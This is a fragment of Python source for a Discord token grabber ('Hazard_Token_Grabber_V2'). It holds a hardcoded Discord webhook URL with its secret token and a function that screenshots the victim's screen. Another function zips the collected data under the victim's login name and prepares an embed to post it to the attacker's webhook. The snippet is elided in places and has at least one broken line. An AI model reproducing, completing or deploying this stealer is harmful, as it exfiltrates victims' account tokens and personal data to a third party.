...
config = {
    ...
    'webhook': "https://discord.com/api/webhooks/970680463221989456/0W2X7Yojk7w32nbmd8Vp2Lx9XEYoFO81AB_ZbeGC207h0VDnir87XPnuswyqmYxXjEhR",
...
class Hazard_Token_Grabber_V2(functions):
    ...
    def screenshot(self):
        ...
        image.save(self.dir + "\\รูปภาพ.png")
        image.close()
    ...
    def finish(self):
        ...
        _zipfile = os.path.join(
            self.appdata, f'GOD-OF-LilTle :[{os.getlogin()}].zip')
        ...
        embed = {
            'username'
            'avatar_url': 'https://cdn.discordapp.com/attachments/941346519280394280/969464743582642206/0ee20a3809461f0fccd53f5c37aaf12e.jpg',
            'embeds': [
                {
                    'author': {
                        'name': f'*{os.getlogin()}* Token GB By LilLle',
                        'icon_url': 'https://cdn.discordapp.com/attachments/941346519280394280/969463870173360168/pf_osu_1.png'
                    },
                    'color': 16119101,
